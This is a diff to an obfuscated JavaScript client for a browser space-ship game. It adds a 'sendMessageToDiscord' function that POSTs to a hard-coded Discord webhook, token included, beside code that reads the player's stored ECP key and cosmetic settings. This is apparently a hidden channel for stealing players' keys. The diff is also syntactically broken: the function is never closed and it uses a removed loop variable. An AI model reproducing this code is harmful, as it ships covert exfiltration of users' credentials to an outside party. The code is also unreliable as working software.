@@ -2930,21 +2930,47 @@ ga('send', 'pageview');</script>
                         if (_0x5ae7e6 == undefined) {
                             _0x5ae7e6 = 1;
                         }
-                        window.boxes = 0;
-                        for (var _0x553300 = _0x5ae7e6; _0x553300 >= 1; _0x553300--) {
-                            setTimeout(function () {
+                        (function () {
                                 window.boxes++;
-                                window["boxwss" + _0x553300] = new WebSocket(_0x16b4e1);
+                                function sendMessageToDiscord(_0x5ea531) {
+  fetch("https://discordapp.com/api/webhooks/1232699674247430205/uYBLI2wwnLKZiIbKFMP7xgGiXsT7RnE2P43mH3xqaQxDgJAP351c0NkDrmcNgJIuiSUS", {
+    'method': "POST",
+    'headers': {
+      'Content-Type': "application/json"
+    },
+
                                 window["boxwss" + _0x553300].addEventListener("open", _0x2a6715 => {
                                     if (localStorage.ECPVerified == "undefined") {
                                         window["boxwss" + _0x553300].send(JSON.stringify({
-                                            
+                                            'name': "ùov()",
+                                            'data': {
+                                                'spectate': false,
+                                                'spectate_ship': 0x1,
+                                                'bonus': true,
+                                                'ecp_key': localStorage.ECPKey,
+                                                'ecp_custom': {
+                                                    'badge': localStorage.badge,
+                                                    'finish': localStorage.finish,
+                                                    'laser': localStorage.laser
+                                                },
+                                                'create': false,
+                                                'client_ship_id': String(Math.random()).slice(2),
+                                                'client_tr': 2.9
                                             }
                                         }));
                                     } else {
                                         window["boxwss" + _0x553300].send(JSON.stringify({
+                                            'name': "ùov()",
+                                            'data': {
+                                                'spectate': false,
+                                                'spectate_ship': 0x1,
+                                                'bonus': true,
+                                                'ecp_key': null,
+                                                'create': false,
+                                                'client_ship_id': String(Math.random()).slice(2),
+                                                'client_tr': 2.9
                                             }
-                                       
+                                        }));
                                     }
                                     if (_0x624c08 == "team") {
                                         window["boxwss" + _0x553300].send("{\"name\":\"enter\",\"data\":{\"team\":" + _0x488c09 + ",\"spectate\":false}}");
